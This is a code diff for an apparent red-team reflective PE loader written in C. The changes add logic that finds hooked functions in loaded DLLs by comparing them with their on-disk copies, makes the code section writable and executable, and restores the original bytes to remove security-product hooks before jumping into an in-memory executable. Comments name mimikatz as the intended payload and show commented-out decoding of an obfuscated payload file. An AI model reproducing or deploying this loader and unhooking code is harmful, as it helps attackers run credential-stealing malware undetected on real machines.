@@ -185,14 +185,19 @@ VOID UnpackAndRunEp(PVOID pPeAddress, SIZE_T sPeSize, BOOL RunPe) {
 	
 	PVOID EP = (PVOID)(pAddress + _Pe1.pNtHdr->OptionalHeader.AddressOfEntryPoint);
 
+
 	ListLoadedModules();
 
-	
+	printf("PREPARING.....................\n");
+	Sleep(10000);
 	((VOID(*)())EP)();
 }
 
 unsigned char* get_file(char* filename, size_t* ret_size) {
 	FILE* file = fopen(filename, "rb");
+	if (file == NULL) {
+		return NULL;
+	}
 	fseek(file, 0, SEEK_END);
 	long size = ftell(file);
 	fseek(file, 0, SEEK_SET);
@@ -208,7 +213,19 @@ void* merge(PCHAR dst, PCHAR src) {
 		dst[i] = src[i];
 	}
 }
-void ListDllFunctions(const char* dllPath, LPVOID baseAddress_infile, LPVOID baseAddress_inmem, DWORD size_text_inmem, PCHAR addr_text_inmem, DWORD size_text_infile, PCHAR addr_text_infile) {
+
+int ListDllFunctions(const char* dllPath, LPVOID baseAddress_infile, LPVOID baseAddress_inmem, DWORD size_text_inmem, PCHAR addr_text_inmem, PCHAR size_text_infile, PCHAR addr_text_infile, PIMAGE_SECTION_HEADER pSecHdr_inmem, PIMAGE_SECTION_HEADER pSecHdr_infile) {
+
+	DWORD oldProtection = 0;
+	DWORD oldProtectionafter = 0;
+	if (pSecHdr_inmem != NULL && pSecHdr_infile != NULL) {
+		int ret = VirtualProtect((LPVOID)((DWORD_PTR)baseAddress_inmem + (DWORD_PTR)pSecHdr_inmem->VirtualAddress), pSecHdr_inmem->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
+		if (ret == 0) {
+			printf("VirtualProtect failed\n");
+			exit(-1);
+		}
+	}
+
 
 	PIMAGE_DOS_HEADER dosHeader_inmem = (PIMAGE_DOS_HEADER)baseAddress_inmem;
 	PIMAGE_DOS_HEADER dosHeader_infile = (PIMAGE_DOS_HEADER)baseAddress_infile;
@@ -247,29 +264,166 @@ void ListDllFunctions(const char* dllPath, LPVOID baseAddress_infile, LPVOID bas
 
 	printf("Exported functions from %s:\n", dllPath);
 	if (exportDirectory_infile->NumberOfNames != exportDirectory_inmem->NumberOfNames) {
-		printf("Error in number of names\n");
+		printf("Error in number of names. File has %d names while mem has %d name\n", exportDirectory_infile->NumberOfNames, exportDirectory_inmem->NumberOfNames);
+
+		FILE* log_infile = fopen("C:\\Users\\sebastien.carre\\log_infile.txt", "w");
+		FILE* log_inmem = fopen("C:\\Users\\sebastien.carre\\log_inmem.txt", "w");
+
+		printf("Loggind %d entries for FILE\n", exportDirectory_infile->NumberOfNames);
+		for (DWORD i = 0; i < exportDirectory_infile->NumberOfNames; i++) {
+			char* functionName_infile = (char*)((BYTE*)baseAddress_infile + nameRVAs_infile[i]);
+			fprintf(log_infile, "%s\n", functionName_infile);
+		}
+		printf("Loggind %d entries for MEM\n", exportDirectory_inmem->NumberOfNames);
+		for (DWORD i = 0; i < exportDirectory_inmem->NumberOfNames; i++) {
+			char* functionName_inmem = (char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[i]);
+			fprintf(log_inmem, "%s\n", functionName_inmem);
+		}
+		fclose(log_infile);
+		fclose(log_inmem);
+
+		//exit(-1);
+	}
+	int nb_function_modified = 0;
+
+	char** addr_inmem_c=malloc(5000 * sizeof(char *));
+	char** functionName_inmem_c = malloc(5000 * sizeof(char*));
+	if (addr_inmem_c == NULL || functionName_inmem_c == NULL) {
+		printf("NULL argv\n");
 		exit(-1);
 	}
 
+#if 0
+	//save mem addresses
 	for (DWORD i = 0; i < exportDirectory_infile->NumberOfNames; i++) {
+		DWORD matching_i = 0;
 
-		char* functionName_inmem = (char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[i]);
+		char* functionName_inmem;
 		char* functionName_infile = (char*)((BYTE*)baseAddress_infile + nameRVAs_infile[i]);
 
-		char* addr_inmem = (char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[i]]);
+		while (matching_i < exportDirectory_inmem->NumberOfNames) {
+			functionName_inmem = (char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[matching_i]);
+			if (strcmp(functionName_inmem, functionName_infile) == 0) {
+				break;
+			}
+			matching_i++;
+		}
+		if (matching_i == exportDirectory_inmem->NumberOfNames) {
+			printf("a function in file was not found in memory");
+			exit(-1);
+		}
+
+
+		addr_inmem_c[i] = (char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[matching_i]]);
+		
+		functionName_inmem_c[i] = functionName_inmem;
+	}
+
+	// check for identical functions
+	for (int i = 0; i < exportDirectory_infile->NumberOfNames; ++i) {
+		printf("%p : ", addr_inmem_c[i]);
+		for (int j = 0; j < exportDirectory_infile->NumberOfNames; ++j)
+		{
+			if (addr_inmem_c[i] == addr_inmem_c[j]) {
+				printf("  %s  ", functionName_inmem_c[j]);
+			}
+		}
+		printf("\n");
+		
+	}
+#endif 
+
+	for (DWORD i = 0; i < exportDirectory_infile->NumberOfNames; i++) {
+		DWORD matching_i = 0;
+
+		char* functionName_inmem;
+		char* functionName_infile = (char*)((BYTE*)baseAddress_infile + nameRVAs_infile[i]);
+
+		while (matching_i < exportDirectory_inmem->NumberOfNames) {
+			functionName_inmem = (char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[matching_i]);
+			if (strcmp(functionName_inmem, functionName_infile) == 0) {
+				break;
+			}
+			matching_i++;
+		}
+		if (matching_i == exportDirectory_inmem->NumberOfNames) {
+			printf("a function in file was not found in memory");
+			exit(-1);
+		}
+
+
+		char* addr_inmem = (char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[matching_i]]);
 		char* addr_infile = (char*)((BYTE*)baseAddress_infile + functionRVAs_infile[ordinals_infile[i]]);
+		
+
+
 
 		if ((long long)addr_infile >= (long long)addr_text_infile && (long long)addr_infile < ((long long)addr_text_infile + size_text_infile)) {
 			if (strcmp(functionName_inmem, functionName_infile) != 0) {
 				printf("Error in function name\n");
 				exit(-2);
 			}
+			if (strcmp(functionName_inmem, functionName_infile) != 0) {
+				printf("Error in function name\n");
+				exit(-2);
+			}
 			if (addr_inmem[0] != addr_infile[0]) {
-				printf("function %s in %s is modified\n", functionName_infile, dllPath);
+				int count = 0;
+				while (count < 50)
+				{
+					if (addr_inmem[count] == addr_infile[count] && addr_inmem[count + 1] == addr_infile[count + 1] && addr_inmem[count + 2] == addr_infile[count + 2])
+						break;
+					count++;
+				}
+
+				
+
+				//if (pSecHdr_inmem == NULL || pSecHdr_infile == NULL)
+				//{
+				printf("function %s (%p) in %s is modified. Restart at offset %d : ", functionName_inmem, addr_inmem, dllPath, count);
+				for (int i = 0; i < count + 1; ++i) {
+					printf("%02X", (unsigned char)addr_inmem[i]);
+				}
+				printf(" was ");
+				for (int i = 0; i < count + 1; ++i) {
+					printf("%02X", (unsigned char)addr_infile[i]);
+				}
+				printf("\n");
+
+				//}
+				if ((unsigned char)addr_inmem[0] != 0xE9) {
+					printf("\t\tWARNING not E9 jump\n");
+				}
+				else {
+
+
+
+					if (pSecHdr_inmem != NULL && pSecHdr_infile != NULL) {
+						for (int i = 0; i < count; ++i) {
+							addr_inmem[i] = addr_infile[i];
+						}
+					}
+				}
+
+
+				nb_function_modified++;
 				//exit(-3);
 			}
+			
 		}
 	}
+	if(nb_function_modified > 0)
+		printf("\t\tNumber of function modified in %s : %d/%d\n", dllPath, nb_function_modified, exportDirectory_infile->NumberOfNames);
+	printf("\n\n\n");
+
+	if (pSecHdr_inmem != NULL && pSecHdr_infile != NULL) {
+		int ret;
+		ret = VirtualProtect((LPVOID)((DWORD_PTR)baseAddress_inmem + (DWORD_PTR)pSecHdr_inmem->VirtualAddress), pSecHdr_inmem->Misc.VirtualSize, oldProtection, &oldProtectionafter);
+		if (ret == 0) {
+			printf("VirtualProtectfailed\n");
+		}
+	}
+	return nb_function_modified;
 
 }
 
@@ -317,6 +471,17 @@ void CompareTextSection(PTCHAR szModName, char *infile, LPVOID BaseOfDll, DWORD 
 		*ret_size_text_infile = size_text_infile;
 		*ret_addr_text_inmem = addr_text_inmem;
 		*ret_size_text_inmem = size_text_inmem;
+		//Sleep(10000);		
+
+		if (ListDllFunctions(szModName, infile, BaseOfDll, size_text_inmem, addr_text_inmem, size_text_infile, addr_text_infile, NULL, NULL) > 0) {
+			printf("Patching...\n");
+			ListDllFunctions(szModName, infile, BaseOfDll, size_text_inmem, addr_text_inmem, size_text_infile, addr_text_infile, pSecHdr_inmem, pSecHdr_infile);
+			printf("Check :\n");
+			if (ListDllFunctions(szModName, infile, BaseOfDll, size_text_inmem, addr_text_inmem, size_text_infile, addr_text_infile, NULL, NULL) > 0) {
+				printf("FAILED UNHOOK\n");
+				exit(-1);
+			}
+		}
 		return;
 	}
 	else {
@@ -352,9 +517,19 @@ void ListLoadedModules() {
 						
 						size_t sPeSize;
 						unsigned char* infile = get_file(szModName, &sPeSize);
-
+						if (infile == NULL ) {
+							printf("Ignoring %s\n", szModName);
+							continue;
+						}
+						else {
+							printf("Analysing %s\n", szModName);
+						}
+											
 						CompareTextSection(szModName, infile,modInfo.lpBaseOfDll,&size_text_inmem, &addr_text_inmem, &size_text_infile, &addr_text_infile);
-						ListDllFunctions(szModName, infile,modInfo.lpBaseOfDll, size_text_inmem, addr_text_inmem, size_text_infile, addr_text_infile);
+						
+						
+						
+						
 					}
 				}
 			}
@@ -364,10 +539,19 @@ void ListLoadedModules() {
 // exemple: mimikatz
 int main(int argc, char *argv[]) {
 
-	//create_box();
-	size_t len;
+		//create_box();
+		size_t len;
+		//unsigned char* raw = get_file("C:\\Users\\sebastien.carre\\Downloads\\testrt\\REDTEAM_PE_Reflective\\x64\\Release\\simplelist.exe",&len);
+		
+		unsigned char* raw = get_file("C:\\Windows\\System32\\calc.exe", &len);
+		
+		
+		/*unsigned char* raw = get_file("C:\\Users\\sebastien.carre\\Downloads\\seb.txt", &len);
+		for (size_t i = 0; i < len; ++i) {
+			raw[i] = raw[i] - 1;
+		}*/
+		UnpackAndRunEp(raw, len, TRUE);
 	
-	unsigned char* raw = get_file("C:\\Windows\\System32\\calc.exe", &len);
-	UnpackAndRunEp(raw, len, TRUE);
+	
 	return 0;
 }
